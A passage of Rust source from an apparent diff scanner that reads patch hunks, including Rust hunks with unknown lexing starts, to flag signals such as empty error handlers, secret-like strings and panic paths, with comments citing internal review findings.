    rules: &[&Rule],
    only: Option<usize>,
    release: bool,
) -> Vec<Vec<Hit>> {
    let hunks = &file.patch_twin.hunks;
    let language = kind.language;
    let legacy = kind.legacy_rules();
    let mut found: Vec<Vec<Hit>> = vec![Vec::new(); hunks.len()];
    let mut read = |text: &[usize], top: bool| {
        let mut lines: Vec<&PatchLine> = Vec::new();
        // Where each hunk's lines end in `lines`.
        let mut ends = Vec::with_capacity(text.len());
        for index in text {
            lines.extend(hunks[*index].lines.iter());
            ends.push(lines.len());
        }
        let mut hits = text_hits(&lines, top, language, rules)
            .into_iter()
            .peekable();
        // Release 0.8.3 read every hunk alone. Outside Rust its scanner and its rules for the
        // signals it had are the ones of today, so there this reading of a hunk alone is its
        // reading (not a further one: YAML read with its quoted scalars as their content);
        // for Rust it is `released_hits`, below.
        let as_released = release && text.len() == 1 && language != Some(Language::Rust);
        let mut start = 0;
        for (index, end) in text.iter().zip(ends) {
            let mut own = Vec::new();
            while let Some(hit) = hits.next_if(|hit| hit.at < end) {
                own.push(Hit {
                    at: hit.at - start,
                    released: as_released && hit.from_code && hit.signal.in_release_0_8_3(),
                    ..hit
                });
            }
            found[*index] = if found[*index].is_empty() {
                own
            } else {
                unite(&found[*index], &own)
            };
            start = end;
        }
    };
    for (index, hunk) in hunks.iter().enumerate() {
        if only.is_none_or(|only| only == index) {
            read(&[index], placed_at_top(file.status, hunk, index == 0));
        }
    }
    for text in joined {
        read(&text.hunks, text.top);
    }
    if language == Some(Language::Rust) {
        for (index, hunk) in hunks.iter().enumerate() {
            if only.is_none_or(|only| only == index) {
                found[index] = unite(&found[index], &released_hits(hunk, &legacy));
            }
        }
    }
    found
}

/// What release 0.8.3 found in `hunk` of a Rust file, `legacy` being the rules of that release
/// the file admits ([`FileKind::legacy_rules`]): the hunk alone, through the view of that
/// release ([`legacy_views`]), by the rules that release had ([`legacy_hits`]). It is one of
/// the readings of every Rust hunk, and what keeps this version from reporting less than
/// that release did.
///
/// The scanner that follows the compiler's lexer is right about text read from a known
/// start, and a hunk has none: from a start that is wrong, being exact goes wrong in other
/// places than the old scanner did (review of the port of the new scanner to the released
/// line, LF-H-1: `crates/*/*/Cargo.toml` in the text of a string the hunk began in opens two
/// comments and closes one, and hid a spawn that release 0.8.3 reports). What this reading
/// adds beside true items is what that scanner got wrong and the release also reported:
/// text of strings and comments it took for code. The rules of today that the release did
/// not have (the reader of tokens among them) do not read this view: no released answer
/// depends on them, and through this view they would report the text of a string after a
/// string over lines, which is what round 13 stopped (measured: 5 more false items on this
/// repository's history and 16 on 603 crates read as created files, no true one; and the
/// fuzz target `rust_tokens`, which holds that strings on earlier lines change none of the
/// reader's signals in a created file, fails).
fn released_hits(hunk: &PatchHunk, legacy: &[&Rule]) -> Vec<Hit> {
    legacy_hits(hunk, legacy, &legacy_views(hunk))
}

/// The reading of `hunk` that release 0.8.3 made of a Rust hunk: the hunk alone, each side
/// read from a fresh state by the scanner of that release ([`rust_legacy_views`]).
fn legacy_views(hunk: &PatchHunk) -> Views {
    let mut lines = vec![(None, None); hunk.lines.len()];
    for new_side in [false, true] {
        let other = if new_side {
            PatchLineKind::Removed
        } else {
            PatchLineKind::Added
        };
        let (places, texts): (Vec<usize>, Vec<&str>) = hunk
            .lines
            .iter()
            .enumerate()
            .filter(|(_, line)| line.kind != other)
            .map(|(at, line)| (at, line.text.as_str()))
            .unzip();
        for (at, code) in places.into_iter().zip(rust_legacy_views(&texts)) {
            if new_side {
                lines[at].1 = Some(code);
            } else {
                lines[at].0 = Some(code);
            }
        }
    }
    Views {
        _held: Held::of(lines.len()),
        lines,
        old: true,
        new: true,
    }
}

/// What release 0.8.3 found in `hunk` of a Rust file: `views`, its reading of the hunk
/// ([`legacy_views`]), read by the rules of that release ([`LEGACY_RUST_RULES`]). This is
/// `hunk_matches` of commit `d4dbc91`, for Rust. Its answer is united with the others like
/// any reading's, so for the signals that release had, no patch has an item there and none
/// here.
fn legacy_hits(hunk: &PatchHunk, rules: &[&Rule], views: &Views) -> Vec<Hit> {
    let mut found = Vec::new();
    for (at, line) in hunk.lines.iter().enumerate() {
        let (side, number, view) = match line.kind {
            PatchLineKind::Context => continue,
            PatchLineKind::Added => (Side::New, line.new_line, views.lines[at].1.as_deref()),
            PatchLineKind::Removed => (Side::Old, line.old_line, views.lines[at].0.as_deref()),
        };
        let Some(number) = number else { continue };
        let hits = |rule: &Rule| {
            let text = match rule.view {
                View::Raw => line.text.as_str(),
                View::Code => view.unwrap_or(line.text.as_str()),
            };
            match rule.matches {
                Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
                Match::AnyCode => !text.trim().is_empty(),
                Match::Secret => looks_like_secret(text),
                // The release had no other kind of rule for Rust.
                Match::Imports(_) | Match::EmptyHandler | Match::Spaced { .. } => false,
            }
        };
        for signal in EvidenceSignal::ALL {
            if rules
                .iter()
                .filter(|r| r.signal == signal && r.side == side)
                .any(|r| hits(r))
            {
                found.push(Hit {
                    at,
                    side,
                    signal,
                    number,
                    basis: Basis::Lexical,
                    likely: false,
                    from_code: false,
                    released: true,
                });
            }
        }
    }
    found
}

/// One reading of a text: the code view of each of its lines on the old and on the new side
/// (comments and strings blank), `None` on a side the line is not on or this reading does not
/// cover.
///
/// This is what a scan holds beside the patch itself: a second copy of each line of the text
/// for each side the line is on. One reading of one text is alive at a time (a reading is
/// made, read by the rules and dropped before the next), so the most a scan holds is one
/// reading of the longest text of the file, and that can be the whole file when its hunks
/// touch or are joined. Nothing else held this until round 17 (ninth independent review,
/// IR9-L-3 and IR9-L-6: memory was a figure measured for some shapes); now every reading
/// counts its lines while it is alive ([`Held`], [`view_lines_peak`]) and a test holds the
/// sentence above.
struct Views {
    lines: Vec<(Option<String>, Option<String>)>,
    /// Whether this reading covers the old side.
    old: bool,
    /// Whether this reading covers the new side.
    new: bool,
    /// Counts the lines of this reading while it is alive.
    _held: Held,
}

std::thread_local! {
    /// The lines of the readings alive on this thread now, and the most there have been
    /// since the count was last begun ([`view_lines_peak`]).
    static VIEW_LINES: std::cell::Cell<(u64, u64)> = const { std::cell::Cell::new((0, 0)) };
}

/// The lines of one reading, counted while the reading is alive.
struct Held(u64);

impl Held {
    fn of(lines: usize) -> Self {
        let lines = lines as u64;
        VIEW_LINES.with(|count| {
            let (alive, peak) = count.get();
            count.set((alive + lines, peak.max(alive + lines)));
        });
        Self(lines)
    }
}

impl Drop for Held {
    fn drop(&mut self) {
        VIEW_LINES.with(|count| {
            let (alive, peak) = count.get();
            count.set((alive.saturating_sub(self.0), peak));
        });
    }
}

/// The most lines that readings alive at one time have held on this thread since the last
/// call, which begins the count again. A reading is the code view of a text ([`Views`]): for
/// each line a copy for each side it is on. For tests that hold what a scan keeps in memory:
/// one reading of one text at a time, so never more lines than the longest text of the file
/// has, however many texts a hunk stands in and however many readings a text has.
#[doc(hidden)]
#[must_use]
pub fn view_lines_peak() -> u64 {
    VIEW_LINES.with(|count| {
        let (alive, peak) = count.get();
        count.set((alive, alive));
        peak
    })
}

/// The one reading of a text in a language the shared scanner reads: both sides, each in the
/// state that scanner reached on it.
fn plain_views(lines: &[&PatchLine], language: Option<Language>) -> Views {
    let mut old_state = ScanState::default();
    let mut new_state = ScanState::default();
    let lines: Vec<_> = lines
        .iter()
        .map(|line| {
            let view = |state: &mut ScanState| language.map(|l| code_view(l, &line.text, state));
            match line.kind {
                PatchLineKind::Context => (view(&mut old_state), view(&mut new_state)),
                PatchLineKind::Added => (None, view(&mut new_state)),
                PatchLineKind::Removed => (view(&mut old_state), None),
            }
        })
        .collect();
    Views {
        _held: Held::of(lines.len()),
        lines,
        old: true,
        new: true,
    }
}

/// One side of a Rust text: its lines, and what a reading needs to know of it.
struct RustText<'a> {
    /// The place of each of its lines in the text.
    places: Vec<usize>,
    /// The lines.
    texts: Vec<&'a str>,
    /// The side can begin inside something the lines above it opened, and the rules read it:
    /// it is not the top of its file, and the change touches it.
    fragment: bool,
}

impl<'a> RustText<'a> {
    /// The side of `lines` that has no line of kind `other`.
    fn of(lines: &[&'a PatchLine], other: PatchLineKind, top: bool) -> Self {
        let (places, texts) = lines
            .iter()
            .enumerate()
            .filter(|(_, line)| line.kind != other)
            .map(|(at, line)| (at, line.text.as_str()))
            .unzip();
        let changed = lines
            .iter()
            .any(|line| line.kind != other && line.kind != PatchLineKind::Context);
        Self {
            places,
            texts,
            fragment: changed && !top,
        }
    }
}

/// One reading of a Rust text: each side that has a start read whole from it, exactly as the
/// compiler would read that text from there, and never mixed with another reading. A raw
/// identifier reads as the identifier it is ([`without_raw_prefixes`]). With the views, what
/// each side's reading says of its strings (`None` for a side with no start).
fn rust_reading(
    length: usize,
    old: &RustText,
    old_start: Option<RustStart>,
    new: &RustText,
    new_start: Option<RustStart>,
) -> (Views, bool, bool) {
    let mut lines = vec![(None, None); length];
    let mut read = |side: &RustText, start: Option<RustStart>, new_side: bool| {
        let Some(start) = start else {
            return false;
        };
        let read = rust_side(&side.texts, start);
        for (at, code) in side.places.iter().zip(read.views) {
            let code = without_raw_prefixes(&code).unwrap_or(code);
            if new_side {
                lines[*at].1 = Some(code);
            } else {
                lines[*at].0 = Some(code);
            }
        }
        read.open_over_lines
    };
    let old_carries = read(old, old_start, false);
    let new_carries = read(new, new_start, true);
    let views = Views {
        _held: Held::of(lines.len()),
        lines,
        old: old_start.is_some(),
        new: new_start.is_some(),
    };
    (views, old_carries, new_carries)
}

/// How many raw-string starts a side is read from at most ([`quote_hash_records`]).
const RAW_STARTS: usize = 4;

/// The counts of `#` with which a raw string that `texts` (the lines of a side) began in can
/// have been opened, lowest first, [`RAW_STARTS`] of them at most.
///
/// A raw string opened with `n` `#` ends at the first quote that at least `n` `#` follow, and
/// its own text may hold any quote with fewer: `href="#top"` in a string opened with two.
/// So in a side that began inside one, the quote that closes it has more `#` after it than
/// any quote before it in the side: it sets a record. The records of a side, in order, are
/// therefore every quote that can be that closing quote, and a reading from inside a raw
/// string with the count of a record ends the string at that record's quote. One reading
/// for each record is exact for every count the string can have been opened with. The
/// quotes are taken from the text as it stands, not from any reading of it: a reading from
/// the wrong start can have the closing quote inside a comment or a character literal.
///
/// Sides of real code have one record or two (measured: see the changelog). A side written
/// to have many (`"#`, then `"##`, then `"###`, …) is read for its first [`RAW_STARTS`]
/// records and no further, so that its cost stays that many readings: a raw string that
/// ends at a later record is a declared miss.
///
/// Until 2026-11-15 the count was that of the first quote of the side with any `#`, which
/// is the first record only: a hunk of a plain `git diff` that began inside `r##"…"##`
/// whose text held `href="#top"` and a URL lost every item after the string (seventh
/// independent review, IR7-M-1).
fn quote_hash_records(texts: &[&str]) -> Vec<usize> {
    let mut records = Vec::new();
    let mut most = 0;
    for text in texts {
        let bytes = text.as_bytes();
        let mut at = 0;
        while let Some(quote) = bytes[at..].iter().position(|byte| *byte == b'"') {
            let after = at + quote + 1;
            let hashes = bytes[after..]
                .iter()
                .take_while(|byte| **byte == b'#')
                .count();
            if hashes > most {
                most = hashes;
                records.push(hashes);
                if records.len() == RAW_STARTS {
                    return records;
                }
            }
            at = after + hashes;
        }
    }
    records
}

/// One item one reading of a text found: on the line at `at` of the text (in what
/// [`texts_found`] gives, of its hunk).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct Hit {
    at: usize,
    side: Side,
    signal: EvidenceSignal,
    /// The line's number on `side`.
    number: u32,
    basis: Basis,
    /// The reader of tokens gives this panic path the hint `test_likely`.
    likely: bool,
    /// The reading from code found it (the first reading of a text).
    from_code: bool,
    /// Release 0.8.3 reported it ([`Evidence::released`]). No reading sets it but that
    /// release's own: [`texts_found`] does.
    released: bool,
}

/// Every signal found on a changed line of the text `lines` (`top`: Git must put its first
/// line at the beginning of the file): once per side, signal and line however many rules,
/// tokens or readings find it, in line order and then [`EvidenceSignal::ALL`] order, with the
/// highest [`Basis`] among what matched.
///
/// A text in a language the shared scanner reads has one reading. A Rust text has one for each
/// start its sides can have. Each is whole (every line of a side read in order from one stated
/// start, exactly as the compiler would read that text from there), each is read by every rule
/// on its own ([`view_matches`]), and what the readings find is united here: an item any of
/// them finds is an item. The bytes of two readings are never united (fifth independent
/// review, IR5-H-1: united bytes showed a comment's text between the tokens of a call, and the
/// call was not found). One reading is made, read and dropped before the next is made: what is
/// kept between them is what they found (sixth independent review, IR6-L-2: with all the
/// readings of a hunk held at once, a three-megabyte fragment took 389 MiB where one reading
/// takes 159).
///
/// The starts of a side:
///
/// - **From code**, always. At the top of the file ([`placed_at_top`]) this is the only
///   reading, and a shebang line there is passed over as the compiler passes over it: such a
///   text is read exactly as the compiler reads it, with nothing guessed. So a patch made
///   with full context (`git diff -U<large>`), whose every hunk reaches the top of its file,
///   has no unknown start at all.
///
/// A side that is not the top of its file and that the change touches (the rules read changed
/// lines only) does not say what the lines above it left open, and is also read:
///
/// - **From the top of a file**, when its first line is a shebang by the compiler's rule: the
///   old position says where Git starts to look for the hunk, not where it finds it, and a
///   hunk that says line 3 is applied at line 1 if its old lines are there. (Read from code,
///   `#!/usr/bin/env run /*` opens a comment; at the top of a file it is no Rust at all.)
/// - **From inside one block comment.** Inside a comment a line `// */ call(); /*` is a call.
/// - **From inside an ordinary string**, when its reading from code carries anything over a
///   line end: a string, a raw string or a block comment. A side that began in a string has
///   its closing quote taken for an opener, and from there on the reading from code has each
///   string's text for code and the code between for strings; or the string's text opens a
///   comment (`crates/*/*/Cargo.toml` opens two and closes one) and the rest of the side is
///   comment. Either way that reading carries something over a line end. It is not told
///   from the end of the side alone: a hunk between two strings over lines (the closing line
///   of one above its change, the opening line of the next below) ends, read from code, in
///   code (sixth independent review, IR6-H-2: every item of such a hunk was lost, `#[ignore]`
///   on a test among them), and one whose string text opens a comment ends in a comment
///   (the review of the port of the scanner to the released line, LF-H-1).
/// - **From inside a raw string**, on the same condition, when the side holds a quote with `#`
///   straight after it. A raw string takes no escapes, and ends at the first quote that as
///   many `#` follow as opened it; its own text may hold quotes with fewer. So the quote
///   that closes the string a side began in has more `#` after it than any quote before it,
///   and the side is read once for each such record ([`quote_hash_records`], at most
///   [`RAW_STARTS`] readings): each is right for the counts that end at its quote. (Read as
///   an ordinary string, a raw string whose text ends in a backslash does not end at its
///   closing quote.)
///
/// Every hunk of a Rust file is read once more as release 0.8.3 read it ([`released_hits`]).
///
/// What no reading covers is in the module `rust_tokens`: a side that begins two or more
/// comments deep; one that begins in a string and carries nothing over a line end when read
/// from code; a raw string opened with no `#` whose closing quote follows a backslash; a raw
/// string that ends at a later record than the readings go to.
///
/// The hint `test_likely` of a panic path is the one the reading from code gives when that
/// reading finds it; when only other readings find it, it has the hint only if each of them
/// gives it.
fn text_hits(
    lines: &[&PatchLine],
    top: bool,
    language: Option<Language>,
    rules: &[&Rule],
) -> Vec<Hit> {
    if language != Some(Language::Rust) {
        let views = plain_views(lines, language);
        let found = view_matches(lines, language, rules, &views, true);
        // YAML is read a second time with each quoted scalar as its content ([`scalar_views`]),
        // and what the two readings find is united: the first reading stays as it was, so no
        // line has fewer items than before (S3.18).
        if language == Some(Language::Yaml)
            && let Some(scalars) = scalar_views(views)
        {
            return unite(
                &found,
                &view_matches(lines, language, rules, &scalars, false),
            );
        }
        return found;
    }
    let old = RustText::of(lines, PatchLineKind::Added, top);
    let new = RustText::of(lines, PatchLineKind::Removed, top);
    let from_code = Some(if top {
        RustStart::FileStart
    } else {
        RustStart::Code
    });
    let (views, old_carries, new_carries) =
        rust_reading(lines.len(), &old, from_code, &new, from_code);
    let mut united = view_matches(lines, language, rules, &views, true);
    drop(views);
    for (old_start, new_start) in further_starts(&old, old_carries)
        .into_iter()
        .zip(further_starts(&new, new_carries))
    {
        if old_start.is_none() && new_start.is_none() {
            continue;
        }
        let (views, _, _) = rust_reading(lines.len(), &old, old_start, &new, new_start);
        let found = view_matches(lines, language, rules, &views, false);
        united = unite(&united, &found);
    }
    united
}

/// `views`, a reading of a YAML text, read again as YAML reads a key and its value
/// ([`scalar_reading`]): each line that reads otherwise in its place, every other line blank
/// (a further reading skips a blank line). `None` when no line reads otherwise. The reading
/// is changed where it stands, so one reading of the text is alive at a time.
fn scalar_views(mut views: Views) -> Option<Views> {
    let mut any = false;
    for view in views
        .lines
        .iter_mut()
        .flat_map(|(old, new)| [old, new])
        .flatten()
    {
        match scalar_reading(view) {
            Some(read) => (*view, any) = (read, true),
            None => view.clear(),
        }
    }
    any.then_some(views)
}

/// The further starts of one side of a Rust text, in the order they are read; `carries` says
/// that its reading from code has something open over a line end. See [`text_hits`].
fn further_starts(side: &RustText, carries: bool) -> [Option<RustStart>; 3 + RAW_STARTS] {
    let in_string = side.fragment && carries;
    let mut starts = [None; 3 + RAW_STARTS];
    starts[0] = (side.fragment && rust_shebang(&side.texts)).then_some(RustStart::FileStart);
    starts[1] = side.fragment.then_some(RustStart::Comment);
    starts[2] = in_string.then_some(RustStart::Str);
    if in_string {
        for (start, hashes) in starts[3..].iter_mut().zip(quote_hash_records(&side.texts)) {
            *start = Some(RustStart::RawStr(hashes));
        }
    }
    starts
}

/// What two readings found, each in line order and then signal order, as one list in that
/// order: an item of both once, with the higher basis, and released if either says so. Its hint is that of the reading from
/// code if one of the two is that (it sees the attribute above the call where another
/// reading, begun inside a comment or a string, may not), and else the hint only if both
/// give it.
fn unite(one: &[Hit], other: &[Hit]) -> Vec<Hit> {
    let mut united = Vec::with_capacity(one.len().max(other.len()));
    let (mut a, mut b) = (one.iter().peekable(), other.iter().peekable());
    loop {
        let order = match (a.peek(), b.peek()) {
            (Some(x), Some(y)) => (x.at, x.side, x.signal).cmp(&(y.at, y.side, y.signal)),
            (Some(_), None) => std::cmp::Ordering::Less,
            (None, Some(_)) => std::cmp::Ordering::Greater,
            (None, None) => return united,
        };
        let next = match order {
            std::cmp::Ordering::Less => a.next().copied(),
            std::cmp::Ordering::Greater => b.next().copied(),
            std::cmp::Ordering::Equal => a.next().zip(b.next()).map(|(x, y)| Hit {
                basis: x.basis.max(y.basis),
                likely: match (x.from_code, y.from_code) {
                    (true, _) => x.likely,
                    (false, true) => y.likely,
                    (false, false) => x.likely && y.likely,
                },
                from_code: x.from_code || y.from_code,
                released: x.released || y.released,
                ..*x
            }),
        };
        united.extend(next);
    }
}

/// The code of the next line on `side` after line `at` of the text `lines`, in the reading
/// `views`: the line that follows it in that version of the file, when the text holds it.
fn next_line_on<'a>(
    lines: &[&'a PatchLine],
    views: &'a [(Option<String>, Option<String>)],
    side: Side,
    at: usize,
) -> Option<&'a str> {
    let other = match side {
        Side::New => PatchLineKind::Removed,
        Side::Old => PatchLineKind::Added,
    };
    let next = at + 1 + lines[at + 1..].iter().position(|l| l.kind != other)?;
    let view = match side {
        Side::New => views[next].1.as_deref(),
        Side::Old => views[next].0.as_deref(),
    };
    Some(view.unwrap_or(lines[next].text.as_str()))
}

/// What every rule finds in one reading of the text `lines` (`from_code`: the first, which
/// starts every side in code), on the changed lines of the sides the reading covers, in line
/// order and then the order of [`EvidenceSignal::ALL`]. Block comments and strings are followed
/// through the text on each side as the reading follows them. In a Rust text the integrity
/// signals come from the tokens of each side ([`rust_tokens::read_hunk`]), merged in line by
/// line: the reader gives them in line order, so nothing is sorted or searched here (a text
/// can hold a million of them).
fn view_matches(
    lines: &[&PatchLine],
    language: Option<Language>,
    rules: &[&Rule],
    reading: &Views,
    from_code: bool,
) -> Vec<Hit> {
    let views = &reading.lines;
    let next_on = |side: Side, at: usize| next_line_on(lines, views, side, at);
    let tokens = if language == Some(Language::Rust) {
        rust_tokens::read_hunk(lines, views, reading.old, reading.new)
    } else {
        rust_tokens::HunkItems::default()
    };
    // How far into each side's token items the lines have come.
    let (mut new_read, mut old_read) = (0usize, 0usize);
    let mut found: Vec<Hit> = Vec::new();
    for (at, line) in lines.iter().enumerate() {
        let (side, covered, number, view, read, read_to) = match line.kind {
            PatchLineKind::Context => continue,
            PatchLineKind::Added => (
                Side::New,
                reading.new,
                line.new_line,
                views[at].1.as_deref(),
                &tokens.new,
                &mut new_read,
            ),
            PatchLineKind::Removed => (
                Side::Old,
                reading.old,
                line.old_line,
                views[at].0.as_deref(),
                &tokens.old,
                &mut old_read,
            ),
        };
        if !covered {
            continue;
        }
        // A further reading of a text repeats nothing the first one did. The rules that read
        // the raw line gave their answer there, and a line that is blank in this reading
        // (as most are in the reading from inside a comment, to its first `*/`) holds no
        // token for a rule or for the reader. So a further reading costs little beyond the
        // scan itself, where it shows nothing. (No test can hold these two skips: without
        // them the answers are the same and only the cost is not.)
        if !from_code && view.is_some_and(|code| code.trim().is_empty()) {
            continue;
        }
        let Some(number) = number else { continue };
        let raw = if from_code && language == Some(Language::Rust) {
            without_raw_prefixes(&line.text)
        } else {
            None
        };
        let raw = raw.as_deref().unwrap_or(line.text.as_str());
        let hits = |rule: &Rule| {
            let text = match rule.view {
                View::Raw => raw,
                // A rule that reads code needs a language; `Scope::Any` code rules have none.
                View::Code => view.unwrap_or(line.text.as_str()),
            };
            match rule.matches {
                Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
                Match::AnyCode => !text.trim().is_empty(),
                Match::Secret => looks_like_secret(text),
                Match::Imports(modules) => imports_module(text, &line.text, modules),
                Match::EmptyHandler => {
                    language.is_some_and(|l| empty_handler(l, text, next_on(side, at)))
                }
                Match::Spaced { heads, tails } => spaced(text, heads, tails),
            }
        };
        for signal in EvidenceSignal::ALL {
            let mut basis = rules
                .iter()
                .filter(|r| r.signal == signal && r.side == side)
                .filter(|r| from_code || matches!(r.view, View::Code))
                .filter(|r| hits(r))
                .map(|r| r.matches.basis())
                .max();
            let mut likely = false;
            // The reader's items are in the order this loop goes in: by line, then by signal.
            while read
                .get(*read_to)
                .is_some_and(|item| (item.line, item.signal) < (at, signal))
            {
                *read_to += 1;
            }
            if let Some(item) = read.get(*read_to)
                && (item.line, item.signal) == (at, signal)
            {
                basis = basis.max(Some(item.basis));
                likely = item.test_likely && side == Side::New;
            }
            if let Some(basis) = basis {
                found.push(Hit {
                    at,
                    side,
                    signal,
                    number,
                    basis,
                    likely,
                    from_code,
                    released: false,
                });
            }
        }
    }
    found
}

/// `text` with the prefix of each raw identifier blanked (`x.r#unwrap()` reads `x.  unwrap()`),
/// or `None` when it holds none. To the compiler `r#unwrap` is the identifier `unwrap`, so a
/// rule that reads a name has to read it the same way; the rules pass over whitespace, and the
/// columns stay where they were (review V3 round 8, VD3R8-M-1: `x.r#unwrap()` and
/// `X::r#unwrap(x)` left no item). The opener of a raw string (`r#"`) is not an identifier and
/// is left alone.
///
/// The `r` starts a name unless what stands before it belongs to one: an ASCII letter, digit or
/// `_`, or a character past ASCII that is not white space. The compiler has five white space
/// characters past ASCII (U+200E and its kin, [`rust_white`]), and after one of them
/// `r#unwrap` is the name as after a blank (fifth independent review, IR5-M-2: taken for part
/// of a name, the mark left `x.<U+200E>r#unwrap()` and `#[<U+200E>r#ignore]` unread).
fn without_raw_prefixes(text: &str) -> Option<String> {
    let bytes = text.as_bytes();
    let in_name = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || !b.is_ascii();
    // Whether `before` ends in a white space character past ASCII (they are 2 or 3 bytes).
    let after_white = |before: &[u8]| {
        (2..=3).any(|n| before.len() >= n && rust_white(&before[before.len() - n..]) == n)
    };
    let mut out: Option<Vec<u8>> = None;
    for (at, _) in text.match_indices("r#") {
        let starts = at == 0 || !in_name(bytes[at - 1]) || after_white(&bytes[..at]);
        let names = bytes
            .get(at + 2)
            .is_some_and(|b| b.is_ascii_alphabetic() || *b == b'_' || !b.is_ascii());
        if starts && names {
            let out = out.get_or_insert_with(|| bytes.to_vec());
            out[at] = b' ';
            out[at + 1] = b' ';
        }
    }
    // Only two ASCII bytes were replaced by two ASCII bytes: still UTF-8.
    out.and_then(|bytes| String::from_utf8(bytes).ok())
}

/// Whether `text` holds one of `heads`, whole and with no [`is_boundary_blocker`] byte before
/// it, followed by one of `tails` ([`follows`]): `# [allow(` holds `#` and `[allow(`.
fn spaced(text: &str, heads: &[&str], tails: &[&str]) -> bool {
    let bytes = text.as_bytes();
    heads.iter().any(|head| {
        text.match_indices(head).any(|(start, _)| {
            (start == 0 || !is_boundary_blocker(bytes[start - 1]))
                && tails
                    .iter()
                    .any(|tail| follows(&bytes[start + head.len()..], tail.as_bytes()).is_some())
        })
    })
}

/// Where `tail` ends in `rest`, when `rest` begins with it and the whitespace before each of
/// the tail's bytes is passed over.
fn follows(rest: &[u8], tail: &[u8]) -> Option<usize> {
    let mut at = 0;
    for expected in tail {
        while rest.get(at).is_some_and(u8::is_ascii_whitespace) {
            at += 1;
        }
        if rest.get(at) != Some(expected) {
            return None;
        }
        at += 1;
    }
    Some(at)
}

/// Whether `code` (a line's code view) opens an error handler that does nothing, given the code
/// of the line after it on the same side (`None` when the hunk ends there).
///
/// - Python: `except …:` whose body is `pass` or `...`, on the same line or the next.
/// - JS and TS: `catch`, with or without a binding, whose block is empty: `{}` on the line, `{`
///   ending the line and `}` starting the next, or the whole empty block on the next line. Also
///   a promise's `.catch(…)` whose handler is a function with an empty body, on one line.
/// - Go: `if err != nil {`, with or without a statement before the test, closed at once, on the
///   line or the next.
///
/// A handler whose body the hunk does not show is not evidence: the next line must be there.
fn empty_handler(language: Language, code: &str, next: Option<&str>) -> bool {
    let line = code.trim();
    let next = next.map(str::trim);
    let nothing = |body: &str| matches!(body, "pass" | "...");
    // The block after `head` is empty: `{}` here, or `{` here and `}` first on the next line.
    let empty_block = |after: &str| {
        let after = after.trim();
        let closed_here = after
            .strip_prefix('{')
            .is_some_and(|rest| rest.trim_start().starts_with('}'));
        let block_on_next_line = after.is_empty()
            && next.is_some_and(|n| {
                n.strip_prefix('{')
                    .is_some_and(|rest| rest.trim_start().starts_with('}'))
            });
        closed_here
            || (after == "{" && next.is_some_and(|n| n.starts_with('}')))
            || block_on_next_line
    };
    match language {
        Language::Python => {
            let Some(rest) = line.strip_prefix("except") else {
                return false;
            };
            if rest.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                return false;
            }
            let Some((_, body)) = rest.rsplit_once(':') else {
                return false;
            };
            let body = body.trim();
            nothing(body) || (body.is_empty() && next.is_some_and(nothing))
        }
        Language::JavaScript => {
            // Each `catch` reads on from where it stands, and the text after one `)` or one
            // `(…)` may be read for many of them (`catch(catch(catch(…`, `.catch((.catch((…`),
            // so what is found after a closer is found once for the line: the closer of each
            // `(` in one pass ([`Parens`]), the next `)` from a place that only moves on, and
            // the block after a binding's `)` once for that `)`. Each was a walk to the end of
            // the line for every `catch` (2 MB of `x.catch((` took 254 s; 2026-11-18).
            let parens = Parens::of(line);
            let (mut next_close, mut block_after) = (NextClose::of(line), None);
            line.match_indices("catch").any(|(at, word)| {
                // A promise's `.catch(…)` swallows when its handler is a function with an
                // empty body.
                if at > 0 && line.as_bytes()[at - 1] == b'.' {
                    return empty_callback(&line[at + word.len()..], &parens);
                }
                let before_ok = at == 0 || !is_boundary_blocker(line.as_bytes()[at - 1]);
                let after = line[at + word.len()..].trim_start();
                if !before_ok || after.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                    return false;
                }
                // An optional binding in parentheses, then the block.
                let Some(binding) = after.strip_prefix('(') else {
                    return empty_block(after);
                };
                let Some(close) = next_close.from(line.len() - binding.len()) else {
                    return false;
                };
                match block_after {
                    Some((seen, empty)) if seen == close => empty,
                    _ => {
                        let empty = empty_block(&line[close + 1..]);
                        block_after = Some((close, empty));
                        empty
                    }
                }
            })
        }
        // `if err != nil {` and `if err := f(); err != nil {`: the test comes last in the head.
        Language::Go => line.strip_prefix("if ").is_some_and(|head| {
            head.rsplit_once("err != nil")
                .is_some_and(|(_, after)| empty_block(after))
        }),
        Language::Rust | Language::Shell | Language::Yaml => false,
    }
}

/// Whether `after` (what follows `.catch` on a line of code) is a call whose argument is a
/// function with an empty body: `(() => {})`, `(e => {})`, `(async (e) => { })`,
/// `(function () {})`. Anything else, including a handler that names a function, is not.
fn empty_callback<'a>(after: &'a str, parens: &Parens<'a>) -> bool {
    let Some(inner) = after.trim_start().strip_prefix('(') else {
        return false;
    };
    let inner = inner.trim_start();
    let inner = inner.strip_prefix("async ").unwrap_or(inner).trim_start();
    let body = if let Some(rest) = inner.strip_prefix("function") {
        // An optional name, then the parameters.
        let rest = rest.trim_start();
        let name = rest.bytes().take_while(|b| is_ident(*b)).count();
        let Some(rest) = rest
            .get(name..)
            .and_then(|rest| parens.after(rest.trim_start()))
        else {
            return false;
        };
        rest
    } else {
        let after_parameters = if inner.starts_with('(') {
            parens.after(inner)
        } else {
            inner.get(inner.bytes().take_while(|b| is_ident(*b)).count()..)
        };
        let Some(rest) = after_parameters.and_then(|rest| rest.trim_start().strip_prefix("=>"))
        else {
            return false;
        };
        rest
    };
    body.trim_start()
        .strip_prefix('{')
        .and_then(|rest| rest.trim_start().strip_prefix('}'))
        .is_some_and(|rest| rest.trim_start().starts_with(')'))
}

/// The `(` of a line of code paired with the `)` that closes it, nesting counted, found in one
/// pass the first time they are asked for. [`Parens::after`] answers for any suffix of the
/// line.
struct Parens<'a> {
    line: &'a str,
    pairs: std::cell::OnceCell<Vec<(usize, usize)>>,
}

impl<'a> Parens<'a> {
    fn of(line: &'a str) -> Self {
        Self {
            line,
            pairs: std::cell::OnceCell::new(),
        }
    }

    /// What follows the `)` that matches the `(` that `text` (a suffix of the line) starts
    /// with: for `(a = f(), b) => {}`, ` => {}`. `None` when `text` does not start with `(` or
    /// it is never closed. The line is a code view, so a parenthesis in a string is blank.
    /// Before, the first `)` ended the parameters, and a default value that calls a function
    /// hid an empty handler (review V3 round 2, VD3R2-L-1); until 2026-11-18 each call walked
    /// from its `(` to the closer.
    fn after(&self, text: &'a str) -> Option<&'a str> {
        if text.as_bytes().first() != Some(&b'(') {
